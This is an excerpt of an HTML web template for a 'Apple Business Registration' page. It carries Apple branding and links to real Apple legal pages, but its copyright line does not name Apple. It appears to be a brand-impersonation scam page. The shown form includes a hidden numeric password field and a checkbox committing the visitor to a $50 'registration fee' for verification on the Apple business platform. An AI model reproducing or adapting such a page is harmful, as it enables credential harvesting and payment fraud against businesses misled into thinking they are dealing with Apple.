...
<head>
    <meta charset="utf-8">
    <title>APPLE BUSINESS</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="icon" type="image/x-icon" href="{{ asset('images/Apple-logo.png')}}">
    <!-- Bootstrap CSS -->
    ...
    <style type="text/css">
        ...
        .custom-file-input{
         ...
         .c-footer__content .c-footer__apple_link a {
            padding: 0;
         }
         a {
            text-decoration: none;
...
<nav class="navbar sticky-top navbar-light">
   <div class="container text-center" style="justify-content: space-around;">
      <a class="navbar-brand" href="/" style="margin-right: 0px;">
         <img src="{{ asset('images/Apple-logo.png')}}" width="30" height="30" alt="">
      </a>
   </div>
</nav>
<div class="container-fluid">
   <div class="container">
      <div class="abr_heading">
            <h1>Apple Business Registration</h1>
        </div>
                  ...
                  <div class="row">
                     ...
                     <div class="col-lg-6" id="password_sec" style="display: none;">
                        <div class="inputbox mt-3">
                           ...
                           <input type="number" inputmode="numeric" name="password" id="password" class="form-control" maxlength="20" value="" required>
                  ...
                  <div class="row">
                      <div class="col-lg-12">
                        <div class="form-check mt-3">
                           ...
                           <label class="form-check-label" for="contacts_form">I, the business representative, agree to pay a one-time registration fee of $50 for the creation and verification of my business in the Apple business platform.</label>
...
<footer class="bg-light c-footer">
   <div class="c-footer__content">
      <span class="c-footer__apple_link">Copyright © 2022 <a href="/">Apple Business Registration.</a></span>
      <div class="c-footer__links">
         <a href="https://www.apple.com/legal/privacy/en-ww/" class="c-button c-minimal-button">
            <span class="c-button__label">Privacy Policy</span>
         </a>
         <a href="https://register.apple.com/tou/PoM/latest/en" class="c-button c-minimal-button">
